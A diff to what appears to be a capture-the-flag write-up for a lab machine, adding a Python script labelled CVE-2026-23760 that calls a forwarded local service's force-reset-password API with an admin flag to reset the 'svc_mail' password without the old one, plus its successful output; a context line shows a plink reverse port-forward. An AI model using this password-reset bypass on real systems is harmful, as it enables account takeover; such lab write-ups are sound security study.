@@ -844,3 +844,45 @@ SHELL> echo y | ./plink.exe -v -ssh -P 2222 -R 17017:127.0.0.1:17017 joel@10.10.
 ```
 
 ![img](./img/Captura7.png)
+
+``` py
+
+import requests
+
+
+def exploit():
+
+    url = 'http://127.0.0.1:17017'
+    data = {"IsSysAdmin":"true",
+    "OldPassword":"watever",
+    "Username":"svc_mail",
+    "NewPassword":"NewPassword123!@#",
+    "ConfirmPassword": "NewPassword123!@#"}
+
+    try:
+
+        r = requests.post(url + "/api/v1/auth/force-reset-password", json=data)
+
+        print("Status: ", r.status_code)
+        print("Content: ", r.json())
+
+    except Exception as e:
+
+        print("Error: ", e)
+
+if __name__ =="__main__":
+
+     exploit()
+
+```
+
+
+``` bash
+
+❯ python3 CVE-2026-23760.py
+Status:  200
+Content:  {'username': '', 'errorCode': '', 'errorData': '', 'debugInfo': 'check1\r\ncheck2\r\ncheck3\r\ncheck4.2\r\ncheck5.2\r\ncheck6.2\r\ncheck7.2\r\ncheck8.2\r\n', 'success': True, 'resultCode': 200}
+╭─ ~/hacking/ctf/htb/medium/danglintree/scripts                                                                    ✔ ─╮
+╰─                                                                                                                   ─╯
+
+```
